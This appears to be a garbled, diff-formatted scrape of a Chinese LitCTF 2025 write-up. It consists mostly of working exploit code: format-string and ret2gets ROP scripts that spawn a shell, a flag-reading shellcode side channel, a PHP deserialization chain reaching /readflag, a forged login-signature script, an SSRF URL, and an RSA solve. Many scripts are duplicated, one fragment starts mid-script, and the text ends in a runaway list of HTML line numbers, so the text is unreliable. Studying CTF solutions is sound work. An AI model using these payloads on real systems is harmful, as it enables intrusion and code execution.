+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+sleep(0.5)
+payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
+payload+= b'%'+str((ogg>>16&0xffff)-0x7b).encode()+b'c%41$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+sleep(0.5)
+payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
+payload+= b'%'+str(add+2+2-0x7b).encode()+b'c%27$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+sleep(0.5)
+payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
+payload+= b'%'+str((ogg>>32)-0x7b).encode()+b'c%41$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+payload = b'%'+str(0x069e).encode()+b'c%39$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+#a=p.recvall()
+#print(len(a)-1
+
+inter()
+
+master_of_rop
+
+题目：
+image
+
+只存在一个gets，没有pop_rdi，如何去控制rdi呢，这里引入一种比较新颖的手法，ret2gets，在 gets 返回后，rdi 通常指向 _IO_stdfile_0_lock，这是一个 libc 中的可写地址。攻击者可以利用这一点，通过 ROP 链再次调用 gets，向 _IO_stdfile_0_lock 写入任意数据，具体原理会另外写一篇文章分析了，这里直接用了
+
+第一个paylaod
+
+payload = b'a'*(0x20)+p64(0)
+payload+= p64(elf.plt['gets'])
+payload+= p64(elf.plt['puts'])
+payload+= p64(0x401100)+p64(0x4011AD)
+
+控制返回地址为gets，往_IO_stdfile_0_lock写入(b"A" * 4 + b"x00"*3)，然后会泄露出TLS，由此计算偏移即可得到libc地址，通知控制返回地址为main，为了第二次打ROP链
+
+这里可以直接用libc中的pop_rdi，也可以用ret2gets的paylaod，这里不能直接输入/bin/sh，调试发现第二个/被转换为. ，可以直接用$0或者
+
+p.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")
+
+from pwn import*
+from struct import pack
+import ctypes
+#from LibcSearcher import *
+from ae64 import AE64
+def bug():
+    gdb.attach(p)
+    pause()
+def s(a):
+    p.send(a)
+def sa(a,b):
+    p.sendafter(a,b)
+def sl(a):
+    p.sendline(a)
+def sla(a,b):
+    p.sendlineafter(a,b)
+def r(a):
+    p.recv(a)
+#def pr(a):
+    #print(p.recv(a))
+def rl(a):
+    return p.recvuntil(a)
+def inter():
+    p.interactive()
+def get_addr(size):
+    return u64(p.recv(size).ljust(8,b'x00'))
+def get_addr64():
+    return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
+def get_addr32():
+    return u32(p.recvuntil("xf7")[-4:])
+def get_sb():
+    return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
+def get_hook():
+    return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
+li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
+ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
+
+#context(os='linux',arch='i386',log_level='debug')   
+context(os='linux',arch='amd64',log_level='debug')
+libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
+
+elf=ELF('./pwn')
+#p=remote('',)
+p = process('./pwn')
+
+rl("Welcome to LitCTF2025!")
+payload = b'a'*(0x20)+p64(0)
+payload+= p64(elf.plt['gets'])
+payload+= p64(elf.plt['puts'])
+payload+= p64(0x401100)+p64(0x4011AD)
+#bug()
+sl(payload)
+
+#pause()
+sleep(0.2)
+p.sendline(b"A" * 4 + b"x00"*3)
+
+p.recv(8)
+p.recv(8)
+tls = u64(p.recv(6) + b"x00x00")
+li(hex(tls))
+libc_base = tls -0x3a5740
+li(hex(libc_base))
+system,bin_sh=get_sb()
+
+rl("Welcome to LitCTF2025!")
+payload = b'a'*(0x20)+p64(0)
+payload+= p64(elf.plt['gets'])
+payload+= p64(system)
+
+#bug()
+sl(payload)
+
+sleep(0.2)
+#sl(b'$0x00')
+p.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")
+inter()
+
+CRYPTO
+
+basic
+
+from Crypto.Util.number import long_to_bytes, inverse
+
+n = 150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893
+e = 65537
+c = 22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505
+
+# Since n is prime, φ(n) = n - 1
+phi_n = n - 1
+d = inverse(e, phi_n)
+m = pow(c, d, n)
+flag = long_to_bytes(m)
+
+print(flag.decode())
+#LitCTF{ee2c30dfe684f13a6e6c07b9ec90cc2c}
+
+ez_math
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line">n = <span class="number">150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Since n is prime, φ(n) = n - 1</span></span><br><span class="line">phi_n = n - <span class="number">1</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment">#LitCTF&#123;ee2c30dfe684f13a6e6c07b9ec90cc2c&#125;</span></span><br><span class="line"></span><br><span class="line">math</span><br><span class="line"></span><br><span class="line">题目给出了三个式子</span><br><span class="line"></span><br><span class="line">结束</span><br><span class="line"></span><br><span class="line">招新小广告</span><br><span class="line"></span><br><span class="line">ChaMd5 Venom 招收大佬入圈</span><br><span class="line"></span><br><span class="line">新成立组IOT+工控+样本分析 长期招新</span><br><span class="line"></span><br><span class="line">欢迎联系admin@chamd5.org</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+// 更新表单的JS提交
+         document.getElementById('profileUpdateForm').addEventListener('submit', async      function(event) {
+            event.preventDefault();
+            const statusEl = document.getElementById('updateStatus');
+            const currentSettingsEl = document.getElementById('currentSettings');
+            statusEl.textContent = '正在更新...';
+
+            const formData = new FormData(event.target);
+            const settingsPayload = {};
+            // 构建 settings 对象，只包含有值的字段
+            if (formData.get('theme')) settingsPayload.theme = formData.get('theme');
+            if (formData.get('language')) settingsPayload.language =                   formData.get('language');
+            // ...可以添加其他字段
+
+            try {
+                const response = await fetch('/api/profile/update', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ settings: settingsPayload }) // 包装在                   "settings"键下
+                });
+                const result = await response.json();
+                if (response.ok) {
+                    statusEl.textContent = '成功: ' + result.message;
+                    currentSettingsEl.textContent = JSON.stringify(result.settings, null,       2);
+                    // 刷新页面以更新导航栏（如果isAdmin状态改变）
+                    setTimeout(() =>window.location.reload(), 1000);
+                } else {
+                    statusEl.textContent = '错误: ' + result.message;
+                }
+            } catch (error) {
+                statusEl.textContent = '请求失败: ' + error.toString();
+            }
+        });
+
+        // 发送原始JSON的函数
+        asyncfunction sendRawJson() {
+            const rawJson = document.getElementById('rawJsonSettings').value;
+            const statusEl = document.getElementById('rawJsonStatus');
+            const currentSettingsEl = document.getElementById('currentSettings');
+            statusEl.textContent = '正在发送...';
+            try {
+                const parsedJson = JSON.parse(rawJson); // 确保是合法的JSON
+                const response = await fetch('/api/profile/update', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(parsedJson) // 直接发送用户输入的JSON
+                });
+                const result = await response.json();
+                if (response.ok) {
+                    statusEl.textContent = '成功: ' + result.message;
+                    currentSettingsEl.textContent = JSON.stringify(result.settings, null, 2);
+                     // 刷新页面以更新导航栏（如果isAdmin状态改变）
+                    setTimeout(() =>window.location.reload(), 1000);
+                } else {
+                    statusEl.textContent = '错误: ' + result.message;
+                }
+            } catch (error) {
+                 statusEl.textContent = '请求失败或JSON无效: ' + error.toString();
+            }
+        }
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+create_function("", 'die(`/readflag`);');
+class Taki
+{
+    private $musubi;
+    private $magic;
+    publicfunction __unserialize(array $data)
+    {
+        $this->musubi = $data['musubi'];
+        $this->magic = $data['magic'];
+        return ($this->musubi)();
+    }
+    publicfunction __call($func,$args){
+        (new $args[0]($args[1]))->{$this->magic}();
+    }
+}
+
+class Mitsuha
+{
+    private $memory;
+    private $thread;
+    publicfunction __invoke()
+    {
+        return$this->memory.$this->thread;
+    }
+}
+
+class KatawareDoki
+{
+    private $soul;
+    private $kuchikamizake;
+    private $name;
+
+    publicfunction __toString()
+    {
+        ($this->soul)->flag($this->kuchikamizake,$this->name);
+        return"call error!no flag!";
+    }
+}
+
+$Litctf2025 = $_POST['Litctf2025'];
+if(!preg_match("/^[Oa]:[d]+/i", $Litctf2025)){
+    unserialize($Litctf2025);
+}else{
+    echo"把O改成C不就行了吗,笨蛋!～(∠・ω< )⌒☆";
+}
+<?php
+
+class Taki
+{
+public $musubi;
+public $magic;
+}
+
+class Mitsuha
+{
+public $memory;
+public $thread;
+}
+
+class KatawareDoki
+
+{
+public $soul;
+public $kuchikamizake;
+public $name;
+}
+
+$a=new Taki();
+$a->musubi=new Mitsuha();
+$a->musubi->memory=new KatawareDoki();
+$a->musubi->memory->kuchikamizake="ReflectionFunction";
+$a->musubi->memory->name=" 0lambda_50";
+$a->musubi->memory->soul=new Taki();
+$a->musubi->memory->soul->musubi='time';
+$a->musubi->memory->soul->magic="invoke";
+$aa=new Arrayobject($a);
+$payload=serialize($aa);
+$payload=str_replace(" 0","%00",$payload);
+echo $payload;
+const loginBtn = document.getElementById('loginBtn');
+        const passwordInput = document.getElementById('password');
+        const errorTip = document.getElementById('errorTip');
+        const rawUsername = document.getElementById('username').value; 
+
+     
+        loginBtn.addEventListener('click', async () => {
+            const rawPassword = passwordInput.value.trim();
+            if (!rawPassword) {
+                errorTip.textContent = '请输入密码';
+                errorTip.classList.add('show');
+                passwordInput.focus();
+                return;
+            }
+
+            const md5Username = CryptoJS.MD5(rawUsername).toString();   
+            const md5Password = CryptoJS.MD5(rawPassword).toString();   
+
+     
+            const shortMd5User = md5Username.slice(0, 6);  
+            const shortMd5Pass = md5Password.slice(0, 6);  
+
+          
+            const timestamp = Date.now().toString(); //五分钟
+
+       
+            const secretKey = 'easy_signin';  
+            const sign = CryptoJS.MD5(shortMd5User + shortMd5Pass + timestamp +       secretKey).toString();
+
+            try {
+                const response = await fetch('login.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-Sign': sign  
+                    },
+                    body: new URLSearchParams({
+                        username: md5Username,   
+                        password: md5Password,   
+                        timestamp: timestamp
+                    })
+                });
+
+                const result = await response.json();
+                if (result.code === 200) {
+                    alert('登录成功！');
+                    window.location.href = 'dashboard.php'; 
+                } else {
+                    errorTip.textContent = result.msg;
+                    errorTip.classList.add('show');
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                    setTimeout(() => errorTip.classList.remove('show'), 3000);
+                }
+            } catch (error) {
+                errorTip.textContent = '网络请求失败';
+                errorTip.classList.add('show');
+                setTimeout(() => errorTip.classList.remove('show'), 3000);
+            }
+        });
+
+        passwordInput.addEventListener('input', () => {
+            errorTip.classList.remove('show');
+        });
+import hashlib
+import time
+import requests
+
+# 目标地址
+url = "http://node9.anna.nssctf.cn:
+23017/login.php"# ← 改成你的实际地址
+
+# 固定信息
+username = "admin"
+password = "admin123"
+secret_key = "easy_signin"
+
+# 当前时间戳（单位：毫秒）
+timestamp = str(int(time.time() * 1000))
+
+# 加密处理
+md5_username = hashlib.md5(username.encode()).hexdigest()
+md5_password = hashlib.md5(password.encode()).hexdigest()
+
+short_md5_user = md5_username[:6]
+short_md5_pass = md5_password[:6]
+
+sign_raw = short_md5_user + short_md5_pass + timestamp + secret_key
+sign = hashlib.md5(sign_raw.encode()).hexdigest()
+
+# 构造请求头和数据
+headers = {
+    "X-Sign": sign
+}
+
+data = {
+    "username": md5_username,
+    "password": md5_password,
+    "timestamp": timestamp
+}
+
+# 发起请求
+response = requests.post(url, headers=headers, data=data)
+
+try:
+    print("[响应状态码]:", response.status_code)
+    print("[响应内容]:", response.text)
+    print(timestamp)
+    print(sign)
+except Exception as e:
+    print("[错误]:", e)
+
+for key, value in response.headers.items():
+    print(f"{key}: {value}")
+/api/sys/urlcode.php？url=127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php
+from pwn import *
+from struct import pack
+import time
+import random
+import ctypes
+#from LibcSearcher import *
+from ae64 import AE64
+
+def bug():
+    gdb.attach(p)
+    pause()
+
+def s(a):
+    p.send(a)
+
+def sa(a,b):
+    p.sendafter(a,b)
+
+def sl(a):
+    p.sendline(a)
+
+def sla(a,b):
+    p.sendlineafter(a,b)
+
+def r(a):
+    return p.recv(a, timeout=1)
+
+def rl(a):
+    return p.recvuntil(a, timeout=1)
+
+def inter():
+    p.interactive()
+
+def get_addr(size):
+    return u64(p.recv(size).ljust(8,b'x00'))
+
+def get_addr64():
+    return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
+
+def get_addr32():
+    return u32(p.recvuntil("xf7")[-4:])
+
+def get_sb():
+    return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
+
+def get_hook():
+    return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
+
+li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
+ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
+
+def log_info(message, status=None):
+    color_codes = {
+        'success': ' 33[92m',
+        'error': ' 33[91m',
+        'warning': ' 33[93m',
+        None: ' 33[95m'
+    }
+    color = color_codes.get(status, ' 33[95m')
+    print(f"{color}[*] {message} 33[0m")
+
+def get_random_delay():
+    return random.uniform(0.1, 0.5)
+
+context(os='linux', arch='amd64', log_level='error')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+elf = ELF('./pwn')
+
+# 完整字符集
+full_charset = "{}0123456789-_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+# 直接在此处设置已知前缀（修改此行即可）
+FLAG_PREFIX = "flag{"  # <-- 在此处修改前缀
+
+if not FLAG_PREFIX:
+    log_info("未设置前缀，将使用完整字典爆破", 'warning')
+    initial_index = 0
+else:
+    initial_index = len(FLAG_PREFIX)
+    log_info(f"将从位置 {initial_index} 开始爆破，前缀: {FLAG_PREFIX}", 'success')
+
+s = full_charset
+char_list = [ord(x) for x in s]
+flag = FLAG_PREFIX  # 初始化flag为预设前缀
+
+shellcode = """
+mov rdi, 0x67616c662f2e
+push rdi
+mov rdi, rsp
+mov rsi, 0
+mov rdx, 0
+mov rax, 2
+syscall
+
+mov rdi, 3
+mov rsi, rsp
+mov rdx, 0x100
+mov rax, 0
+syscall
+
+mov bl, byte ptr [rsp+{}]
+cmp bl, {}
+jz $-0x3 
+"""
+
+index = initial_index
+MAX_RETRY = 5
+MAX_CONSECUTIVE_FAILURES = 10
+consecutive_failures = 0
+
+while True:
+    if consecutive_failures >= MAX_CONSECUTIVE_FAILURES:
+        log_info("检测到信道不稳定，暂停5秒后重试", 'warning')
+        time.sleep(5)
+        consecutive_failures = 0
+
+    for i in range(len(s)):
+        retry_count = MAX_RETRY
+        success = False
+
+        while retry_count > 0 and not success:
+            time.sleep(get_random_delay())
+
+            try:
+                # 切换本地/远程模式
+                p = process('./pwn')
+                #p = remote('node8.anna.nssctf.cn', 22581)
+
+                payload = asm(shellcode.format(index, char_list[i]))
+                sla(b'Please input your shellcode: n', payload)
+
+                try:
+                    judge = rl(b'n')
+                
+except (EOFError, TimeoutError):
+                    log_info(f"字符 {s[i]} 导致连接关闭，重试 ({MAX_RETRY-retry_count+1}/{MAX_RETRY})", 'warning')
+                    retry_count -= 1
+                    consecutive_failures += 1
+                    p.close()
+                    continue
+
+                if len(judge) < 3:
+                    flag += s[i]
+                    log_info(f"找到字符: {s[i]}, 当前flag: {flag}", 'success')
+                    index += 1
+                    success = True
+                    consecutive_failures = 0
+
+                p.close()
+
+            
+except Exception as e:
+                log_info(f"连接异常: {str(e)}，剩余重试: {retry_count}", 'error')
+                retry_count -= 1
+                consecutive_failures += 1
+                if p:
+                    p.close()
+            finally:
+                if p:
+                    p.close()
+
+        if success:
+            break
+
+    if '}' in flag:
+        log_info(f"最终flag: {flag}", 'success')
+        exit(0)
+
+inter()
+from pwn import*
+from struct import pack
+import ctypes
+#from LibcSearcher import *
+from ae64 import AE64
+def bug():
+    gdb.attach(p)
+    pause()
+def s(a):
+    p.send(a)
+def sa(a,b):
+    p.sendafter(a,b)
+def sl(a):
+    p.sendline(a)
+def sla(a,b):
+    p.sendlineafter(a,b)
+def r(a):
+    p.recv(a)
+#def pr(a):
+    #print(p.recv(a))
+def rl(a):
+    return p.recvuntil(a)
+def inter():
+    p.interactive()
+def get_addr(size):
+    return u64(p.recv(size).ljust(8,b'x00'))
+def get_addr64():
+    return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
+def get_addr32():
+    return u32(p.recvuntil("xf7")[-4:])
+def get_sb():
+    return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
+def get_hook():
+    return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
+li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
+ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
+
+#context(os='linux',arch='i386',log_level='debug')   
+context(os='linux',arch='amd64',log_level='debug')
+libc=ELF('./libc-2.31.so')   
+
+elf=ELF('./fmt')
+#p=remote('',)
+p = process('./fmt')
+rl(b'0x')
+stack=int(p.recv(12),16)
+li(hex(stack))
+rl(b'0x')
+libc_base=int(p.recv(12),16)-libc.sym['puts']
+li(hex(libc_base))
+ogg=libc_base+0xe3b01
+addr=(stack&0xffff)-15
+payload  = b'%p'*9
+payload += b'%'+str(addr - 92).encode()+b'c%hn'#11
+payload += b'%'+str(0x10007b-addr).encode()+b'c%39$hhn'
+#bug()
+s(payload)
+add=(stack+17-0x18)&0xffff
+li(hex(add))
+sleep(0.5)
+payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
+payload+= b'%'+str(add-0x7b).encode()+b'c%27$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+sleep(0.5)
+payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
+payload+= b'%'+str((ogg&0xffff)-0x7b).encode()+b'c%41$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+sleep(0.5)
+payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
+payload+= b'%'+str(add+2-0x7b).encode()+b'c%27$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+sleep(0.5)
+payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
+payload+= b'%'+str((ogg>>16&0xffff)-0x7b).encode()+b'c%41$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+sleep(0.5)
+payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
+payload+= b'%'+str(add+2+2-0x7b).encode()+b'c%27$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+sleep(0.5)
+payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
+payload+= b'%'+str((ogg>>32)-0x7b).encode()+b'c%41$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+payload = b'%'+str(0x069e).encode()+b'c%39$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+#a=p.recvall()
+#print(len(a)-1
+
+inter()
+payload = b'a'*(0x20)+p64(0)
+payload+= p64(elf.plt['gets'])
+payload+= p64(elf.plt['puts'])
+payload+= p64(0x401100)+p64(0x4011AD)
+p.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")
+from pwn import*
+from struct import pack
+import ctypes
+#from LibcSearcher import *
+from ae64 import AE64
+def bug():
+    gdb.attach(p)
+    pause()
+def s(a):
+    p.send(a)
+def sa(a,b):
+    p.sendafter(a,b)
+def sl(a):
+    p.sendline(a)
+def sla(a,b):
+    p.sendlineafter(a,b)
+def r(a):
+    p.recv(a)
+#def pr(a):
+    #print(p.recv(a))
+def rl(a):
+    return p.recvuntil(a)
+def inter():
+    p.interactive()
+def get_addr(size):
+    return u64(p.recv(size).ljust(8,b'x00'))
+def get_addr64():
+    return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
+def get_addr32():
+    return u32(p.recvuntil("xf7")[-4:])
+def get_sb():
+    return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
+def get_hook():
+    return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
+li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
+ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
+
+#context(os='linux',arch='i386',log_level='debug')   
+context(os='linux',arch='amd64',log_level='debug')
+libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
+
+elf=ELF('./pwn')
+#p=remote('',)
+p = process('./pwn')
+
+rl("Welcome to LitCTF2025!")
+payload = b'a'*(0x20)+p64(0)
+payload+= p64(elf.plt['gets'])
+payload+= p64(elf.plt['puts'])
+payload+= p64(0x401100)+p64(0x4011AD)
+#bug()
+sl(payload)
+
+#pause()
+sleep(0.2)
+p.sendline(b"A" * 4 + b"x00"*3)
+
+p.recv(8)
+p.recv(8)
+tls = u64(p.recv(6) + b"x00x00")
+li(hex(tls))
+libc_base = tls -0x3a5740
+li(hex(libc_base))
+system,bin_sh=get_sb()
+
+rl("Welcome to LitCTF2025!")
+payload = b'a'*(0x20)+p64(0)
+payload+= p64(elf.plt['gets'])
+payload+= p64(system)
+
+#bug()
+sl(payload)
+
+sleep(0.2)
+#sl(b'$0x00')
+p.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")
+inter()
+from Crypto.Util.number import long_to_bytes, inverse
+
+n = 150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893
+e = 65537
+c = 22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505
+
+# Since n is prime, φ(n) = n - 1
+phi_n = n - 1
+d = inverse(e, phi_n)
+m = pow(c, d, n)
+flag = long_to_bytes(m)
+
+print(flag.decode())
+#LitCTF{ee2c30dfe684f13a6e6c07b9ec90cc2c}
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span 